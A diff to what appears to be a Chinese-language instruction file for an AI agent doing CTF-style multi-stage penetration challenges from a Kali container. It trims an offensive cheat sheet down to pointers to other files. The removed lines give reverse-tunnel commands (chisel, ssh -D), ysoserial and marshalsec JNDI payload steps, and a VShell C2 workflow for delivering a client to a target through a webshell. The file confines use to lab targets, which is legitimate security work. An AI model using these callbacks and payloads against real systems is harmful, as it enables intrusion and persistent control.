@@ -45,24 +45,10 @@ Kali 容器里，拥有完整的推理循环：你负责推理、决策与使用
 - **每拿到一个阶段立刻落盘到笔记**：进入方式、精确请求/载荷、凭据或会话值、对哪个主机有效。
   下一轮重试（包括子 Agent）从笔记续接，而不是从零重来。
 - **向内枚举**：`ip addr`、`/etc/hosts`、云元数据、配置里的后端地址；`nmap -Pn` 打内部段，记录每个内部地址的来源。
-- **建立隧道（按可达性选一种，命令写进笔记，重连比重找入口便宜）**：
-  - VShell：`add_tunnel`（socks5，绑定已上线的被控端）→ 本地 `127.0.0.1:<port>`；
-  - chisel：agent 容器跑 `chisel server -p 8080 --reverse`，靶机跑
-    `chisel client <agent容器IP>:8080 R:socks` → 本地 1080；
-  - ssh：拿到凭据后 `ssh -D 1080 -N user@host`；
-  - 不支持 socks 的工具（smbclient/impacket/redis-cli）挂代理：
-    `proxychains4 -f /opt/red-harness/proxychains.conf <tool>`（先把末行端口改成你的隧道端口）。
-- **Windows/AD 横向**：`netexec`（nxc）、`impacket-*`、`certipy-ad`、`bloodhound.py`、
-  `kerbrute` 不在镜像内时用 `impacket-GetNPUsers` 枚举；SMB 共享用 `smbclient`。
-- **云/K8s 题**：`kubectl`、`awscli` 已装；先找 kubeconfig/凭据，再枚举工作负载与 Secret。
-- **已知 CVE / 指纹题**：`nuclei -u <url> -t /opt/nuclei-templates -severity critical,high,medium -silent`
-  （模板离线内置，不要 `-update-templates`）；`searchsploit <产品> <版本>` 查离线 PoC，
-  `searchsploit -m <EDB-ID>` 取到当前目录后按需改写。先确认版本指纹（`whatweb`/响应头/`/version`）再查。
-- **Java 反序列化**：`ysoserial <Gadget> '<命令>' | base64 -w0` 生成序列化 payload
-  （无参数运行 `ysoserial` 看 gadget 列表，JDK 11 运行）；`marshalsec marshalsec.jndi.LDAPRefServer
-  'http://<你的IP>:<端口>/#ExploitClass' 1389` 起恶意 LDAP 服务配合 JNDI 注入点。
-  依赖库不在目标 classpath 时改用 `searchsploit` 找现成链。
-- **二进制/逆向**：`checksec` 看保护、`r2 -A` 静态分析、`ROPgadget` 找 gadget、`patchelf` 改解释器/依赖。
+- **工具速查**：隧道（chisel / ssh -D / proxychains）、AD（nxc / impacket / certipy /
+  bloodhound）、云（kubectl / aws）、已知 CVE（nuclei / searchsploit）、Java（ysoserial /
+  marshalsec）、逆向（checksec / r2 / ROPgadget）的具体命令见
+  `$HARNESS_KNOWLEDGE_DIRS/methodology/exploitation-recipes.md`。命令写进笔记，重连比重找入口便宜。
 - **逐阶段验证**：每阶段产出是下一阶段的输入（凭据、token、内部 URL、文件），验证成立再推进。
 - **最后才提取目标**：链路走到目标服务后 flag 才可得。答案必须来自目标服务本身的输出，不能是入口处的推测。
 - **阶段账本**：`阶段 → 状态(完成/阻塞) → 证据 → 下一步`。会话被切时，账本就是交接单。
@@ -82,23 +68,13 @@ Kali 容器里，拥有完整的推理循环：你负责推理、决策与使用
 - **让工具输出结构化**：`ffuf -of json -o out.json`、`feroxbuster --json`、把状态码/长度/耗时并列，
   便于你自己比对差异，而不是在几千行终端输出里靠记忆找异常。
 
-## 多段题：VShell 工具链（mcp__vshell__*）
+## 多段题：VShell（按需加载）
 
-需要在内网横向、保持持久控制时，用内置的 VShell MCP 工具（27 个）：
-
-1. `add_listener`（mode=tcp，记下 vkey/salt）——在本题的 agent 容器上开监听；
-   **listen_addr 必须写 `0.0.0.0:<端口>` 或 `hostname -I` 得到的容器 IP，不要写 127.0.0.1**，
-   否则靶机上的客户端无法回连；
-2. `generate_client`（kind=stageless 或 listen，arch=linux/amd64，save_path 到工作目录）；
-3. 用你已经拿到的 RCE/webshell 把生成的客户端投递到靶机并执行（base64 分块上传或 wget 均可）；
-4. `list_hosts` 拿到 `host_id`，之后 `execute_command` 直接在靶机执行命令、`list_directory`/`read_file` 取文件；
-5. `add_tunnel`（mode=socks5）后，通过隧道访问靶机所在内网的其它服务。
-
-纪律：
-- 只对本题靶场目标使用；**绝不对平台自身、其他容器或非授权地址使用**。
-- `execute_command` 是真实非交互 shell，`vim`/`top`/`passwd` 之类会卡住；长命令加超时。
-- 某一步 30-60 秒没反应就回退到 bash + curl/ssh/chisel，不要卡在 MCP 上。
-- VShell 为多段题服务；单段 Web 题直接打，不要为了用工具而用工具。
+需要持久控制或内网横向时用内置 VShell MCP（27 个工具）。它们默认**不直接可见**：
+先 `tool_search`（如 `vshell listener tunnel execute`）加载，再调用 `mcp__vshell__*`。
+完整流程（监听 → 生成客户端 → 投递靶机 → `list_hosts` → `execute_command` → `add_tunnel`）
+与监听地址注意事项见 `$HARNESS_KNOWLEDGE_DIRS/methodology/vshell-workflow.md`。
+只对本题靶场目标使用；某一步 30-60 秒无响应就回退 bash + curl/ssh/chisel。
 
 ## 子 Agent 派发（并行工作）
 
